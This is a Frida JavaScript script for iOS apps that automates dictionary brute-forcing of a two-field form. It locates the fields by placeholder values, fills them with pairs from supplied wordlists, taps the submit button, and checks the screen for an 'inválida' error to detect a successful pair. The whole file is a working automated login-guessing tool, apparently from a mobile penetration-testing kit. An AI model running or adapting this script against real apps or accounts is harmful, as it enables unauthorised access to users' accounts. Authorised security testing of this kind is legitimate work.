'use strict';

recv('start', function onMessage(msg) {

	/* == Requirements ===================================================== */

	/* placeholders to match [field_0, field_1, actionButton] */
	var toMatch = ['2222', '22222-2', 'ok'];

	/* delay to check the success */
	var sleep = 12;

	/* success conditions */
	function checkSuccess(try_0, try_1) {
		ObjC.classes.NSThread.sleepForTimeInterval_(sleep);

		var viewStr = ObjC.classes.UIWindow.keyWindow().recursiveDescription().toString();
		var success = true;

		if (viewStr.indexOf('inválida') !== -1)
			success = false;

		return (success + '|' + try_0 + ' / ' + try_1);
	}

	/* == Finding brute-forcible fields ==================================== */

	var field_0;
	var field_1;
	var goButtn;
	var textFields = ObjC.chooseSync(ObjC.classes.UITextField);

	for (var i = 0; i < textFields.length; i++) {
		var fd = textFields[i];
		if (fd.text() && fd.text().toString() == toMatch[0]) {
			if(!field_0) {
				field_0 = fd;
				send('[*] Match found for field_0');
			} else {
				send('[*] Double match found for field_0! Automation may fail\n');
			}
		} else if (fd.text() && fd.text().toString() == toMatch[1]) {
			if(!field_1) {
				field_1 = fd;
				send('[*] Match found for field_1');
			} else {
				send('[*] Double match found for field_1! Automation may fail\n');
			}
		}
	}

	var buttons = ObjC.chooseSync(ObjC.classes.UIButton);

	for (var i = 0; i < buttons.length; i++) {
		var bt = buttons[i];
		if (bt.titleLabel().text() && bt.titleLabel().text().toString() == toMatch[2]) {
			if(!goButtn) {
				goButtn = bt;
				send('[*] Match found for goButtn');
			} else {
				send('[*] Double match found for goButtn! Automation may fail\n');
				break;
			}
		}
	}

	/* == Brute-forcing ==================================================== */

	if (field_0 && field_1 && goButtn) {
		/* getting dictionaries [dict_0, dict_1] */
		var inputList = msg.list;
		var dict_0 = inputList[0].trim().split('\n');
		var dict_1 = inputList[1].trim().split('\n');
		var count = 1;

		for (var i = 0; i < dict_0.length; i++) {
			for (var j = 0; j < dict_1.length; j++) {
				var tryfor_f0 = dict_0[i];
				var tryfor_f1 = dict_1[j];
				/* altering UIKit values using the main thread (https://github.com/frida/frida/issues/664) */
				ObjC.schedule(ObjC.mainQueue, function () {
					field_0.setText_(tryfor_f0);
					field_1.setText_(tryfor_f1);
					send('[' + (count++) + '] Trying -> ' + field_0.text().toString() + ' / ' + field_1.text().toString());
					/* using the event UIControlEventTouchUpInside to simulate a click */
					goButtn.sendActionsForControlEvents_(1 << 6);
				});
				/* checking success conditions */
				var res = checkSuccess(tryfor_f0, tryfor_f1);
				send(res);
			}
		}
		send('done|');

	} else {
		send('[*] Required matches not found... Please try different matches');
		send('done|');
	}
});
